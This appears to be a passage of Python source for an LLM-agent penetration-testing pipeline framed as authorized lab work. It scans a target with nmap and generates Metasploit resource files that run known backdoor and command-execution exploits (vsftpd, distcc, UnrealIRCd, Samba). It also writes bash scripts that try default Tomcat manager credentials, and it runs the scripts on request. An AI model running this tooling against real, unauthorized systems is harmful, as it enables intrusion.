import argparse
import json
import shutil
import subprocess
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import agents.intel_agents  # noqa: F401 - registers agents
import agents.red_team_blockchain_agent  # noqa: F401 - registers red_team_blockchain_attack_agent
import agents.red_team_linux_agent  # noqa: F401 - registers red_team_linux_attack_agent
import agents.red_team_web_agent  # noqa: F401 - registers red_team_web_attack_agent
import agents.red_team_windows_agent  # noqa: F401 - registers red_team_windows_attack_agent
from agents.registry import AgentRegistry
from crew_threat_intel import (
    RUNS_DIR,
    _open_services,
    build_run_artifacts,
    next_artifact_run_id,
    run_agent_task,
    run_nmap_stage,
    run_nmap_tool_stage,
    run_vulnerability_stage,
    run_vulnerability_tool_stage,
    summarize_services,
)
from tasks.intel_tasks import (
    create_red_team_exploit_planning_task,
    create_red_team_reporting_task,
    create_red_team_tool_generation_task,
)
from tasks.red_team_blockchain_tasks import create_red_team_blockchain_planning_task
from tasks.red_team_linux_tasks import create_red_team_linux_planning_task
from tasks.red_team_web_tasks import create_red_team_web_planning_task
from tasks.red_team_windows_tasks import create_red_team_windows_planning_task


CURRENT_RED_TEAM_TOOLS_DIR = Path("outputs") / "generated_red_team_tools"

RED_TEAM_SPECIALISTS = {
    "web": "red_team_web_attack_agent",
    "linux": "red_team_linux_attack_agent",
    "windows": "red_team_windows_attack_agent",
    "blockchain": "red_team_blockchain_attack_agent",
}

RED_TEAM_SPECIALIST_TASKS = {
    "web": create_red_team_web_planning_task,
    "linux": create_red_team_linux_planning_task,
    "windows": create_red_team_windows_planning_task,
    "blockchain": create_red_team_blockchain_planning_task,
}


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Run the authorized lab red-team validation pipeline.")
    parser.add_argument("target", nargs="?", default="172.17.0.2", help="Authorized lab target.")
    parser.add_argument("--domain", choices=sorted(RED_TEAM_SPECIALISTS), help="Run only one specialist domain.")
    parser.add_argument("--ports", default="1-10000", help="Nmap port expression.")
    parser.add_argument("--timeout", type=int, default=180, help="Nmap timeout in seconds.")
    parser.add_argument("--reuse-scan", default="", help="Optional existing Nmap JSON file.")
    parser.add_argument("--use-agents", action="store_true", help="Use LLM agents for planning/reporting.")
    parser.add_argument("--no-nmap-agent", action="store_true", help="Use the Nmap tool directly instead of nmap_scan_agent.")
    parser.add_argument(
        "--execute",
        action="store_true",
        help="Execute generated validation scripts. Default only generates the scripts.",
    )
    parser.add_argument("--execution-timeout", type=int, default=180, help="Timeout per generated script.")
    return parser.parse_args()


def _service_set(scan: dict[str, Any]) -> set[tuple[int, str, str, str]]:
    services = set()
    for item in _open_services(scan):
        services.add(
            (
                int(item.get("port") or 0),
                str(item.get("service") or "").lower(),
                str(item.get("product") or "").lower(),
                str(item.get("version") or "").lower(),
            )
        )
    return services


def build_exploit_plan(target: str, scan: dict[str, Any], vulnerability_scan: dict[str, Any]) -> dict[str, Any]:
    services = _service_set(scan)
    candidates: list[dict[str, Any]] = []
    specialist_notes = {
        "web": [],
        "linux": [],
        "windows": [],
        "blockchain": [],
    }

    def add(domain: str, name: str, port: int, module: str, reason: str, command: str = "id") -> None:
        candidates.append(
            {
                "domain": domain,
                "name": name,
                "target": target,
                "port": port,
                "metasploit_module": module,
                "validation_command": command,
                "reason": reason,
                "safety": "Authorized lab validation only; no persistence, no credential theft, no destructive actions.",
            }
        )

    for port, service, product, version in services:
        if port == 21 and "vsftpd" in product and "2.3.4" in version:
            add("linux", "vsftpd_234_backdoor", port, "exploit/unix/ftp/vsftpd_234_backdoor", "vsftpd 2.3.4 is a known backdoored release.")
        if port == 3632 or "distccd" in product:
            add("linux", "distcc_exec", port, "exploit/unix/misc/distcc_exec", "distccd is exposed and commonly allows remote command validation in lab images.")
        if service == "irc" and "unrealircd" in product:
            add("linux", "unreal_ircd_3281_backdoor", port, "exploit/unix/irc/unreal_ircd_3281_backdoor", "UnrealIRCd on Metasploitable-style labs is commonly backdoored.")
        if port == 1099 or "rmi" in service or "rmi" in product:
            add("linux", "java_rmi_server", port, "exploit/multi/misc/java_rmi_server", "Java RMI registry is exposed and should be checked for unsafe remote class loading.")
        if port in {139, 445} and "samba" in product:
            add("windows", "samba_usermap_script", port, "exploit/multi/samba/usermap_script", "Old Samba/SMB surfaces may be vulnerable to command execution or unsafe file-sharing behavior.")
        if port == 8180 or "tomcat" in product:
            add("web", "tomcat_mgr_login_check", port, "auxiliary/scanner/http/tomcat_mgr_login", "Tomcat manager exposure should be validated with non-destructive login checks.")
        if service in {"http", "http-proxy"} or port in {80, 443, 8000, 8009, 8080, 8180, 8443}:
            specialist_notes["web"].append(f"Web-facing service on port {port}: {product or service} {version}".strip())
        if port in {139, 445, 3389, 5985, 5986, 389, 636, 88} or service in {"netbios-ssn", "microsoft-ds", "rdp", "ldap", "kerberos"}:
            specialist_notes["windows"].append(f"Windows/SMB/AD-adjacent service on port {port}: {product or service}".strip())
        if port in {8545, 8546, 30303, 8332, 8333, 18332, 18333, 26657, 26656, 9944, 9933}:
            add("blockchain", "blockchain_rpc_exposure_check", port, "read_only_rpc_probe", "Blockchain/node RPC-style port is exposed and should be checked with read-only metadata calls.", "web3_clientVersion")
            specialist_notes["blockchain"].append(f"Blockchain/RPC-style port {port} is exposed.")

    if not specialist_notes["blockchain"]:
        specialist_notes["blockchain"].append("No common blockchain RPC or node ports were observed in the enumeration.")

    risk_counts: dict[str, int] = {}
    for finding in vulnerability_scan.get("findings", []):
        risk = str(finding.get("risk") or "unknown").lower()
        risk_counts[risk] = risk_counts.get(risk, 0) + 1

    return {
        "target": target,
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "candidate_count": len(candidates),
        "risk_counts": risk_counts,
        "specialists": {
            domain: {
                "agent": agent,
                "candidate_count": len([item for item in candidates if item.get("domain") == domain]),
                "notes": specialist_notes[domain],
            }
            for domain, agent in RED_TEAM_SPECIALISTS.items()
        },
        "candidates": candidates,
        "notes": [
            "Use --execute to run generated validation scripts.",
            "Generated scripts use Metasploit check/run commands only when msfconsole is available.",
            "Keep this pipeline on explicitly authorized lab targets.",
        ],
    }


def _script_header(name: str, target: str) -> str:
    return (
        "#!/usr/bin/env bash\n"
        "set -euo pipefail\n\n"
        f"# Generated by red_team_tool_generation_agent for authorized target {target}.\n"
        "# Default mode is safe validation. Review before use.\n\n"
        f'TARGET="${{TARGET:-{target}}}"\n'
        'OUT_DIR="${OUT_DIR:-$(pwd)}"\n'
        'mkdir -p "$OUT_DIR"\n'
        'log(){ printf "[%s] %s\\n" "$(date -u +%FT%TZ)" "$*"; }\n'
        'need(){ command -v "$1" >/dev/null 2>&1 || { log "missing dependency: $1"; exit 20; }; }\n\n'
    )


def _nmap_vuln_script(target: str, ports: str) -> str:
    return (
        _script_header("redteam_nmap_vuln", target)
        + f'PORTS="${{PORTS:-{ports}}}"\n'
        + 'need nmap\n'
        + 'log "running bounded nmap vuln validation against $TARGET ports $PORTS"\n'
        + 'nmap -Pn -sV --script vuln --max-retries 2 --host-timeout 120s -p "$PORTS" "$TARGET" '
        + '| tee "$OUT_DIR/01_nmap_vuln.txt"\n'
    )


def _exploitdb_mapping_script(target: str, plan: dict[str, Any]) -> str:
    names = sorted({c["name"].replace("_", " ") for c in plan.get("candidates", [])})
    body = _script_header("redteam_exploitdb_mapping", target)
    body += 'if command -v searchsploit >/dev/null 2>&1; then\n'
    for name in names:
        body += f'  log "searchsploit: {name}"\n  searchsploit "{name}" | tee -a "$OUT_DIR/02_searchsploit.txt" || true\n'
    body += 'else\n  log "searchsploit not installed; writing candidate names only"\n'
    for name in names:
        body += f'  printf "%s\\n" "{name}" >> "$OUT_DIR/02_searchsploit.txt"\n'
    body += "fi\n"
    return body


def _metasploit_resource(plan: dict[str, Any]) -> str:
    lines = ["spool msf_validation.log"]
    for candidate in plan.get("candidates", []):
        module = candidate["metasploit_module"]
        port = candidate["port"]
        command = candidate.get("validation_command", "id")
        lines.extend(
            [
                f"use {module}",
                "setg VERBOSE false",
                f"set RHOSTS {candidate['target']}",
                f"set RPORT {port}",
                f"set CMD {command}",
                "check",
                "run -j",
                "sleep 3",
                "sessions -l",
                "sessions -K",
            ]
        )
    lines.extend(["spool off", "exit -y", ""])
    return "\n".join(lines)


def _metasploit_runner_script(target: str) -> str:
    return (
        _script_header("redteam_metasploit_validation", target)
        + 'RC_FILE="${RC_FILE:-$OUT_DIR/03_metasploit_validation.rc}"\n'
        + 'need msfconsole\n'
        + 'log "running Metasploit validation resource $RC_FILE"\n'
        + 'msfconsole -q -r "$RC_FILE" | tee "$OUT_DIR/03_metasploit_validation.txt"\n'
    )


def _web_checks_script(target: str, scan: dict[str, Any]) -> str:
    ports = " ".join(
        str(item.get("port"))
        for item in _open_services(scan)
        if str(item.get("service") or "").lower() in {"http", "http-proxy"} or int(item.get("port") or 0) in {80, 443, 8009, 8080, 8180, 8443}
    )
    return (
        _script_header("redteam_web_checks", target)
        + f'PORTS="{ports}"\n'
        + 'need curl\n'
        + 'for port in $PORTS; do\n'
        + '  scheme="http"; [ "$port" = "443" ] || [ "$port" = "8443" ] && scheme="https"\n'
        + '  url="$scheme://$TARGET:$port/"\n'
        + '  log "web header check $url"\n'
        + '  curl -kIsS --max-time 8 "$url" >> "$OUT_DIR/05_web_headers.txt" 2>&1 || true\n'
        + '  log "dangerous method check $url"\n'
        + '  curl -kIsS -X OPTIONS --max-time 8 "$url" >> "$OUT_DIR/05_web_options.txt" 2>&1 || true\n'
        + '  if [ "$port" = "8180" ]; then\n'
        + '    manager_url="${url%/}/manager/html"\n'
        + '    log "tomcat manager default credential validation $manager_url"\n'
        + '    for cred in tomcat:tomcat both:tomcat role1:tomcat admin:admin manager:manager; do\n'
        + '      code=$(curl -k -sS -o /dev/null -w "%{http_code}" --max-time 8 -u "$cred" "$manager_url" || true)\n'
        + '      printf "%s %s %s\\n" "$manager_url" "$cred" "$code" >> "$OUT_DIR/05_tomcat_manager_login_checks.txt"\n'
        + '      if [ "$code" = "200" ]; then\n'
        + '        printf "tomcat_manager_default_credentials port=%s credential=%s url=%s\\n" "$port" "$cred" "$manager_url" >> "$OUT_DIR/confirmed_exploits.txt"\n'
        + '      fi\n'
        + '    done\n'
        + '  fi\n'
        + 'done\n'
    )


def _linux_checks_script(target: str, plan: dict[str, Any]) -> str:
    linux_ports = " ".join(str(item["port"]) for item in plan.get("candidates", []) if item.get("domain") == "linux")
    return (
        _script_header("redteam_linux_checks", target)
        + f'PORTS="{linux_ports}"\n'
        + 'need nc\n'
        + 'for port in $PORTS; do\n'
        + '  log "linux service banner check $TARGET:$port"\n'
        + '  timeout 5 nc -nv "$TARGET" "$port" < /dev/null >> "$OUT_DIR/06_linux_banners.txt" 2>&1 || true\n'
        + 'done\n'
    )


def _windows_checks_script(target: str, scan: dict[str, Any]) -> str:
    smb_ports = " ".join(
        str(item.get("port"))
        for item in _open_services(scan)
        if int(item.get("port") or 0) in {139, 445, 3389, 5985, 5986, 389, 636, 88}
    )
    return (
        _script_header("redteam_windows_checks", target)
        + f'PORTS="{smb_ports}"\n'
        + 'if command -v smbclient >/dev/null 2>&1; then\n'
        + '  log "anonymous SMB share listing check"\n'
        + '  smbclient -L "//$TARGET" -N -g >> "$OUT_DIR/07_smbclient.txt" 2>&1 || true\n'
        + 'else\n'
        + '  log "smbclient missing; using nc banner checks"\n'
        + '  need nc\n'
        + '  for port in $PORTS; do timeout 5 nc -nv "$TARGET" "$port" < /dev/null >> "$OUT_DIR/07_windows_banners.txt" 2>&1 || true; done\n'
        + 'fi\n'
    )


def _blockchain_checks_script(target: str, scan: dict[str, Any]) -> str:
    rpc_ports = " ".join(
        str(item.get("port"))
        for item in _open_services(scan)
        if int(item.get("port") or 0) in {8545, 8546, 8332, 18332, 26657, 9944, 9933}
    )
    return (
        _script_header("redteam_blockchain_checks", target)
        + f'PORTS="{rpc_ports}"\n'
        + 'need curl\n'
        + 'if [ -z "$PORTS" ]; then log "no common blockchain RPC ports observed"; exit 0; fi\n'
        + 'for port in $PORTS; do\n'
        + '  url="http://$TARGET:$port"\n'
        + '  log "read-only blockchain RPC metadata probe $url"\n'
        + '  curl -sS --max-time 8 -H "Content-Type: application/json" '
        + "--data '{\"jsonrpc\":\"2.0\",\"method\":\"web3_clientVersion\",\"params\":[],\"id\":1}' "
        + '"$url" >> "$OUT_DIR/08_blockchain_rpc.txt" 2>&1 || true\n'
        + 'done\n'
    )


def _manual_probe_script(target: str, scan: dict[str, Any]) -> str:
    ports = " ".join(str(item.get("port")) for item in _open_services(scan) if item.get("port"))
    return (
        _script_header("redteam_manual_service_probes", target)
        + f'PORTS="{ports}"\n'
        + 'need nc\n'
        + 'for port in $PORTS; do\n'
        + '  log "banner probe $TARGET:$port"\n'
        + '  timeout 4 bash -c "printf \'\'; nc -nv $TARGET $port" < /dev/null '
        + '>> "$OUT_DIR/04_banner_probes.txt" 2>&1 || true\n'
        + 'done\n'
    )


def _write_executable(path: Path, body: str) -> None:
    path.write_text(body, encoding="utf-8")
    path.chmod(0o750)


def generate_red_team_tools(artifact_run_id: int, target: str, ports: str, scan: dict[str, Any], plan: dict[str, Any]) -> dict[str, Any]:
    tools_dir = RUNS_DIR / f"run_{artifact_run_id:04d}" / "red_team_tools"
    if tools_dir.exists():
        shutil.rmtree(tools_dir)
    tools_dir.mkdir(parents=True, exist_ok=True)

    if CURRENT_RED_TEAM_TOOLS_DIR.exists():
        shutil.rmtree(CURRENT_RED_TEAM_TOOLS_DIR)
    CURRENT_RED_TEAM_TOOLS_DIR.mkdir(parents=True, exist_ok=True)

    scripts = [
        ("01_redteam_nmap_vuln.sh", "redteam_nmap_vuln", _nmap_vuln_script(target, ports), ["nmap"]),
        ("02_redteam_exploitdb_mapping.sh", "redteam_exploitdb_mapping", _exploitdb_mapping_script(target, plan), ["searchsploit"]),
        ("03_redteam_metasploit_validation.sh", "redteam_metasploit_validation", _metasploit_runner_script(target), ["msfconsole"]),
        ("04_redteam_manual_service_probes.sh", "redteam_manual_service_probes", _manual_probe_script(target, scan), ["nc"]),
        ("05_redteam_web_checks.sh", "redteam_web_checks", _web_checks_script(target, scan), ["curl"], "web"),
        ("06_redteam_linux_checks.sh", "redteam_linux_checks", _linux_checks_script(target, plan), ["nc"], "linux"),
        ("07_redteam_windows_checks.sh", "redteam_windows_checks", _windows_checks_script(target, scan), ["smbclient", "nc"], "windows"),
        ("08_redteam_blockchain_checks.sh", "redteam_blockchain_checks", _blockchain_checks_script(target, scan), ["curl"], "blockchain"),
    ]

    rc_path = tools_dir / "03_metasploit_validation.rc"
    rc_path.write_text(_metasploit_resource(plan), encoding="utf-8")
    shutil.copy2(rc_path, CURRENT_RED_TEAM_TOOLS_DIR / rc_path.name)

    manifest = {
        "agent": "red_team_tool_generation_agent",
        "target": target,
        "mode": "generated_each_run",
        "safety": "Scripts are bounded to the supplied authorized lab target. Active validation runs only when --execute is used.",
        "metasploit_resource": str(rc_path),
        "scripts": [],
    }

    for item in scripts:
        filename, name, body, deps = item[:4]
        domain = item[4] if len(item) > 4 else "coordinator"
        path = tools_dir / filename
        current_path = CURRENT_RED_TEAM_TOOLS_DIR / filename
        _write_executable(path, body)
        shutil.copy2(path, current_path)
        manifest["scripts"].append(
            {
                "name": name,
                "filename": filename,
                "path": str(path),
                "current_path": str(current_path),
                "domain": domain,
                "agent": RED_TEAM_SPECIALISTS.get(domain, "red_team_tool_generation_agent"),
                "dependencies": deps,
                "purpose": "Controlled red-team validation for authorized lab evidence.",
            }
        )

    manifest_path = tools_dir / "manifest.json"
    manifest_path.write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    current_manifest_path = CURRENT_RED_TEAM_TOOLS_DIR / "manifest.json"
    current_manifest_path.write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    return {
        "tools_dir": tools_dir,
        "manifest_path": manifest_path,
        "current_tools_dir": CURRENT_RED_TEAM_TOOLS_DIR,
        "current_manifest_path": current_manifest_path,
        "manifest": manifest,
    }


def execute_red_team_tools(tool_artifacts: dict[str, Any], timeout: int = 180) -> dict[str, Any]:
    tools_dir = Path(tool_artifacts["tools_dir"])
    execution_dir = tools_dir / "execution"
    if execution_dir.exists():
        shutil.rmtree(execution_dir)
    execution_dir.mkdir(parents=True, exist_ok=True)

    results = {
        "mode": "execute",
        "tools_dir": str(tools_dir),
        "execution_dir": str(execution_dir),
        "timeout_seconds": timeout,
        "results": [],
    }
    env = {"OUT_DIR": str(execution_dir), **dict()}
    for script in tool_artifacts["manifest"].get("scripts", []):
        path = Path(script["path"])
        stdout_path = execution_dir / f"{path.stem}.stdout.txt"
        stderr_path = execution_dir / f"{path.stem}.stderr.txt"
        try:
            completed = subprocess.run(
                [str(path)],
                capture_output=True,
                text=True,
                timeout=timeout,
                check=False,
                env={**__import__("os").environ, **env},
            )
            status = "ok" if completed.returncode == 0 else "skipped" if completed.returncode == 20 else "failed"
            stdout = completed.stdout
            stderr = completed.stderr
            returncode = completed.returncode
        except subprocess.TimeoutExpired as exc:
            status = "timeout"
            stdout = exc.stdout or ""
            stderr = exc.stderr or ""
            returncode = 124
        stdout_path.write_text(stdout, encoding="utf-8")
        stderr_path.write_text(stderr, encoding="utf-8")
        results["results"].append(
            {
                "script": script["filename"],
                "domain": script.get("domain", "coordinator"),
                "agent": script.get("agent", "red_team_tool_generation_agent"),
                "status": status,
                "returncode": returncode,
                "stdout_path": str(stdout_path),
                "stderr_path": str(stderr_path),
                "dependencies": script.get("dependencies", []),
            }
        )

    results_path = execution_dir / "execution_results.json"
    results["results_path"] = str(results_path)
    results_path.write_text(json.dumps(results, indent=2), encoding="utf-8")
    return results


def _script_for_domain(domain: str, target: str, scan: dict[str, Any], plan: dict[str, Any]) -> tuple[str, str, list[str]]:
    if domain == "web":
        return "redteam_web_checks", _web_checks_script(target, scan), ["curl"]
    if domain == "linux":
        return "redteam_linux_checks", _linux_checks_script(target, plan), ["nc"]
    if domain == "windows":
        return "redteam_windows_checks", _windows_checks_script(target, scan), ["smbclient", "nc"]
    if domain == "blockchain":
        return "redteam_blockchain_checks", _blockchain_checks_script(target, scan), ["curl"]
    raise ValueError(f"Unsupported red-team domain: {domain}")


def generate_specialist_tools(
    artifact_run_id: int,
    domain: str,
    target: str,
    scan: dict[str, Any],
    plan: dict[str, Any],
) -> dict[str, Any]:
    tools_dir = RUNS_DIR / f"run_{artifact_run_id:04d}" / f"{domain}_agent"
    if tools_dir.exists():
        shutil.rmtree(tools_dir)
    tools_dir.mkdir(parents=True, exist_ok=True)

    agent_name = RED_TEAM_SPECIALISTS[domain]
    script_name, script_body, dependencies = _script_for_domain(domain, target, scan, plan)
    script_path = tools_dir / f"{script_name}.sh"
    _write_executable(script_path, script_body)

    domain_plan = {
        **plan,
        "candidate_count": len([item for item in plan.get("candidates", []) if item.get("domain") == domain]),
        "candidates": [item for item in plan.get("candidates", []) if item.get("domain") == domain],
        "specialists": {domain: plan.get("specialists", {}).get(domain, {})},
    }
    rc_path = None
    domain_candidates = domain_plan["candidates"]
    if domain_candidates:
        rc_path = tools_dir / f"{domain}_metasploit_validation.rc"
        rc_path.write_text(_metasploit_resource({**domain_plan, "candidates": domain_candidates}), encoding="utf-8")

    manifest = {
        "agent": agent_name,
        "domain": domain,
        "target": target,
        "mode": "single_agent",
        "safety": "Focused validation for one requested specialist only.",
        "scripts": [
            {
                "name": script_name,
                "filename": script_path.name,
                "path": str(script_path),
                "domain": domain,
                "agent": agent_name,
                "dependencies": dependencies,
            }
        ],
    }
    if rc_path:
        manifest["metasploit_resource"] = str(rc_path)

    manifest_path = tools_dir / "manifest.json"
    manifest_path.write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    return {
        "tools_dir": tools_dir,
        "manifest_path": manifest_path,
        "manifest": manifest,
        "domain_plan": domain_plan,
    }


def execute_specialist_tools(tool_artifacts: dict[str, Any], timeout: int = 180) -> dict[str, Any]:
    tools_dir = Path(tool_artifacts["tools_dir"])
    execution_dir = tools_dir / "execution"
    if execution_dir.exists():
        shutil.rmtree(execution_dir)
    execution_dir.mkdir(parents=True, exist_ok=True)

    results = {
        "mode": "execute",
        "execution_dir": str(execution_dir),
        "timeout_seconds": timeout,
        "results": [],
    }
    for script in tool_artifacts["manifest"].get("scripts", []):
        path = Path(script["path"])
        stdout_path = execution_dir / f"{path.stem}.stdout.txt"
        stderr_path = execution_dir / f"{path.stem}.stderr.txt"
        try:
            completed = subprocess.run(
                [str(path)],
                capture_output=True,
                text=True,
                timeout=timeout,
                check=False,
                env={**__import__("os").environ, "OUT_DIR": str(execution_dir)},
            )
            status = "ok" if completed.returncode == 0 else "skipped" if completed.returncode == 20 else "failed"
            stdout = completed.stdout
            stderr = completed.stderr
            returncode = completed.returncode
        except subprocess.TimeoutExpired as exc:
            status = "timeout"
            stdout = exc.stdout or ""
            stderr = exc.stderr or ""
            returncode = 124

        stdout_path.write_text(stdout, encoding="utf-8")
        stderr_path.write_text(stderr, encoding="utf-8")
        results["results"].append(
            {
                "script": script["filename"],
                "domain": script["domain"],
                "agent": script["agent"],
                "status": status,
                "returncode": returncode,
                "stdout_path": str(stdout_path),
                "stderr_path": str(stderr_path),
            }
        )

    results_path = execution_dir / "execution_results.json"
    results["results_path"] = str(results_path)
    results_path.write_text(json.dumps(results, indent=2), encoding="utf-8")
    return results


def extract_confirmed_exploits(execution: dict[str, Any] | None) -> list[str]:
    if not execution:
        return []
    execution_dir = Path(str(execution.get("execution_dir", "")))
    confirmed_path = execution_dir / "confirmed_exploits.txt"
    if not confirmed_path.exists():
        return []
    findings = []
    for line in confirmed_path.read_text(encoding="utf-8").splitlines():
        cleaned = line.strip()
        if cleaned:
            findings.append(cleaned)
    return findings


def build_executive_summary(
    target: str,
    domain: str,
    plan: dict[str, Any],
    execution: dict[str, Any] | None,
    nmap_source: str,
) -> str:
    candidates = plan.get("candidates", [])
    executed = execution.get("results", []) if execution else []
    working_exploits = extract_confirmed_exploits(execution)
    skipped: list[str] = []
    failed: list[str] = []
    for item in executed:
        if item.get("status") == "ok":
            # Domain scripts are validation checks, not confirmed exploit shells.
            continue
        if item.get("status") == "skipped":
            skipped.append(f"{item.get('script')} skipped")
        elif item.get("status") in {"failed", "timeout"}:
            failed.append(f"{item.get('script')} {item.get('status')}")

    lines = [
        "# Executive Summary",
        "",
        f"Target: `{target}`",
        f"Specialist: `{domain}`",
        f"Enumeration source: `{nmap_source}`",
        "",
        "## Result",
        "",
    ]
    if working_exploits:
        lines.extend(f"- Confirmed working exploit/validation: `{item}`" for item in working_exploits)
    else:
        lines.append("- No exploit was confirmed as working in this run.")

    lines.extend(["", "## Candidate Exploits", ""])
    if candidates:
        for candidate in candidates:
            lines.append(f"- `{candidate['name']}` on port `{candidate['port']}`: {candidate['reason']}")
    else:
        lines.append("- No exploit candidates for this specialist.")

    lines.extend(["", "## Validation Checks", ""])
    if executed:
        for item in executed:
            lines.append(f"- `{item['script']}`: `{item['status']}`")
    else:
        lines.append("- Validation scripts were generated but not executed.")

    if skipped or failed:
        lines.extend(["", "## Gaps", ""])
        lines.extend(f"- {item}" for item in skipped + failed)
    return "\n".join(lines).rstrip() + "\n"


def run_red_team_specialist_pipeline(
    domain: str,
    target: str = "172.17.0.2",
    ports: str = "1-10000",
    timeout: int = 180,
    reuse_scan: str = "",
    use_nmap_agent: bool = True,
    use_llm_agent: bool = False,
    execute: bool = False,
    execution_timeout: int = 180,
) -> dict[str, Any]:
    if domain not in RED_TEAM_SPECIALISTS:
        raise ValueError(f"Unsupported red-team domain: {domain}")

    artifact_run_id = next_artifact_run_id()
    if reuse_scan:
        scan, nmap_output = run_nmap_tool_stage(target, ports, timeout, reuse_scan)
        nmap_source = f"reused scan: {reuse_scan}"
    elif use_nmap_agent:
        scan, nmap_output = run_nmap_stage(target, ports, timeout)
        nmap_source = "nmap_scan_agent"
    else:
        scan, nmap_output = run_nmap_tool_stage(target, ports, timeout)
        nmap_source = "nmap_tool"

    vulnerability_scan, vulnerability_context = run_vulnerability_tool_stage(scan)
    plan = build_exploit_plan(target, scan, vulnerability_scan)
    domain_plan = {
        **plan,
        "candidate_count": len([item for item in plan["candidates"] if item.get("domain") == domain]),
        "candidates": [item for item in plan["candidates"] if item.get("domain") == domain],
        "specialists": {domain: plan["specialists"][domain]},
    }

    agent_output = ""
    if use_llm_agent:
        agent_name = RED_TEAM_SPECIALISTS[domain]
        agent = AgentRegistry.get_agent(agent_name)
        task = RED_TEAM_SPECIALIST_TASKS[domain](
            agent,
            target,
            json.dumps(scan, indent=2),
            vulnerability_context,
        )
        agent_output = run_agent_task(agent_name, task)

    tool_artifacts = generate_specialist_tools(artifact_run_id, domain, target, scan, domain_plan)
    execution = execute_specialist_tools(tool_artifacts, execution_timeout) if execute else None
    working_exploits = extract_confirmed_exploits(execution)
    summary = build_executive_summary(target, domain, domain_plan, execution, nmap_source)

    run_dir = Path(tool_artifacts["tools_dir"])
    result_path = run_dir / "result.json"
    summary_path = run_dir / "executive_summary.md"
    scan_path = run_dir / "nmap_scan.json"
    nmap_output_path = run_dir / "nmap_output.txt"
    scan_path.write_text(json.dumps(scan, indent=2), encoding="utf-8")
    nmap_output_path.write_text(nmap_output, encoding="utf-8")
    summary_path.write_text(summary, encoding="utf-8")

    result = {
        "status": "complete",
        "artifact_run_id": artifact_run_id,
        "domain": domain,
        "agent": RED_TEAM_SPECIALISTS[domain],
        "target": target,
        "nmap_source": nmap_source,
        "candidate_count": domain_plan["candidate_count"],
        "candidates": domain_plan["candidates"],
        "execute": execute,
        "execution": execution,
        "working_exploits": working_exploits,
        "executive_summary": summary,
        "agent_output": agent_output,
        "artifacts": {
            "run_dir": str(run_dir),
            "result": str(result_path),
            "executive_summary": str(summary_path),
            "tool_manifest": str(tool_artifacts["manifest_path"]),
            "nmap_scan": str(scan_path),
            "nmap_output": str(nmap_output_path),
        },
    }
    if execution:
        result["artifacts"]["execution_results"] = execution["results_path"]
    result_path.write_text(json.dumps(result, indent=2), encoding="utf-8")
    return result


def build_red_team_report(target: str, service_summary: str, plan: dict[str, Any], execution: dict[str, Any] | None) -> str:
    lines = [
        "# Red Team Validation Report",
        "",
        f"Target: `{target}`",
        "",
        "## Enumeration Summary",
        "",
        "```text",
        service_summary,
        "```",
        "",
        "## Specialist Coverage",
        "",
    ]
    for domain, summary in plan.get("specialists", {}).items():
        lines.append(
            f"- `{domain}` via `{summary.get('agent')}`: `{summary.get('candidate_count', 0)}` candidate(s)"
        )
    lines.extend(["", "## Candidate Exploit Validations", ""])
    if not plan.get("candidates"):
        lines.append("No high-confidence exploit validation candidates were generated from the scan.")
    for candidate in plan.get("candidates", []):
        lines.append(
            f"- `{candidate['domain']}`: `{candidate['name']}` on port `{candidate['port']}` using `{candidate['metasploit_module']}`: {candidate['reason']}"
        )
    lines.extend(["", "## Execution Results", ""])
    if not execution:
        lines.append("Generated tools were not executed. Re-run with `--execute` for active validation.")
    else:
        for item in execution.get("results", []):
            lines.append(f"- `{item['script']}`: `{item['status']}` (return code `{item['returncode']}`)")
    lines.extend(
        [
            "",
            "## Safety Bounds",
            "",
            "- Authorized lab target only.",
            "- No persistence, credential theft, or destructive actions are included.",
            "- Metasploit sessions are listed then killed by the generated resource file.",
        ]
    )
    return "\n".join(lines).rstrip() + "\n"


def run_red_team_pipeline(
    target: str = "172.17.0.2",
    ports: str = "1-10000",
    timeout: int = 180,
    reuse_scan: str = "",
    use_agents: bool = False,
    execute: bool = False,
    execution_timeout: int = 180,
) -> dict[str, Any]:
    artifact_run_id = next_artifact_run_id()
    if use_agents:
        scan, nmap_output = run_nmap_stage(target, ports, timeout, reuse_scan)
        vulnerability_scan, vulnerability_output = run_vulnerability_stage(scan)
    else:
        scan, nmap_output = run_nmap_tool_stage(target, ports, timeout, reuse_scan)
        vulnerability_scan, vulnerability_output = run_vulnerability_tool_stage(scan)

    service_summary = summarize_services(scan)
    deterministic_plan = build_exploit_plan(target, scan, vulnerability_scan)
    plan_text = json.dumps(deterministic_plan, indent=2)

    agents_used = [
        "red_team_recon_agent",
        "red_team_exploit_planner_agent",
        *RED_TEAM_SPECIALISTS.values(),
        "red_team_tool_generation_agent",
        "red_team_reporting_agent",
    ]
    tools_used = [
        "nmap_tool",
        "vulnerability_scan_tool",
        "exploitdb_tool",
        "knowledge_base_tool",
        "generated_red_team_tools",
    ]

    if use_agents:
        specialist_outputs = {}
        for domain, agent_name in RED_TEAM_SPECIALISTS.items():
            specialist_agent = AgentRegistry.get_agent(agent_name)
            specialist_task = RED_TEAM_SPECIALIST_TASKS[domain](
                specialist_agent,
                target,
                json.dumps(scan, indent=2),
                vulnerability_output,
            )
            specialist_outputs[domain] = run_agent_task(agent_name, specialist_task)

        planner = AgentRegistry.get_agent("red_team_exploit_planner_agent")
        planning_task = create_red_team_exploit_planning_task(
            planner,
            target,
            json.dumps(scan, indent=2),
            vulnerability_output + "\n\nSpecialist outputs:\n" + json.dumps(specialist_outputs, indent=2),
        )
        plan_text = run_agent_task("red_team_exploit_planner_agent", planning_task)
        specialist_path = RUNS_DIR / f"run_{artifact_run_id:04d}" / "red_team_specialist_outputs.json"
        specialist_path.parent.mkdir(parents=True, exist_ok=True)
        specialist_path.write_text(json.dumps(specialist_outputs, indent=2), encoding="utf-8")

    tool_artifacts = generate_red_team_tools(artifact_run_id, target, ports, scan, deterministic_plan)
    execution = execute_red_team_tools(tool_artifacts, execution_timeout) if execute else None
    execution_context = json.dumps(execution or {"status": "not_executed"}, indent=2)
    report = build_red_team_report(target, service_summary, deterministic_plan, execution)

    if use_agents:
        reporter = AgentRegistry.get_agent("red_team_reporting_agent")
        report_task = create_red_team_reporting_task(
            reporter,
            target,
            json.dumps(scan, indent=2),
            plan_text,
            execution_context,
        )
        report = run_agent_task("red_team_reporting_agent", report_task)

